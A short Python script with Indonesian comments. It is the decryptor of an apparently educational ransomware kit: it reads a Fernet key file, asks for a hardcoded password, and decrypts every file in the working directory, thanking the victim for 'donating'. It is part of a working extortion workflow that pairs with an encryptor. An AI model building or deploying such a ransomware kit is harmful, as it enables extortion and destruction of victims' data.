import os
from cryptography.fernet import Fernet
#tempat untuk menampung nama-nama file
files = []

#perulangan for untuk mencari file
for file in os.listdir():
        # Melewati file-file tertentu yang tidak ingin didekripsi
        if file =="Ransomware1.py" or file =="thekey.key" or file =="dekripR1.py":
            continue
        # Menambahkan file ke daftar jika file tersebut adalah file biasa (bukan direktori)
        if os.path.isfile(file):
            files.append(file)
# Menampilkan daftar file yang akan dienkripsi biar pas pengujian tahu mana saja yang di dekripsi      
print(files)

# Membuka file thekey.key dalam mode baca biner
with open("thekey.key", "rb") as key:
    secretkey = key.read()
    
#membuat password untuk menjalankan code dibawah
secretPass = "Leosycthe"
#suruh masukan password rahasia
userPass = input("\n Enter the secret password to decrypt your file!!: ")

#apabila benar maka Mengiterasi setiap file dalam daftar files untuk melakukan dekripsi
if userPass == "Leosycthe":
    for file in files:
        # Membuka file dalam mode baca biner
        with open(file,"rb") as thefile:
            contents = thefile.read()
        # Membuat objek Fernet menggunakan kunci rahasia
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        # Membuka file dalam mode tulis biner dan menulis isi yang telah didekripsi
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
    print("\n------------------------------------------------------------------------------------------------")
    print("\nThankyou for donate!!!")
    print("\n------------------------------------------------------------------------------------------------")
else:
    print("\n------------------------------------------------------------------------------------------------")
    print("\nWrong password")
    print("\n------------------------------------------------------------------------------------------------")

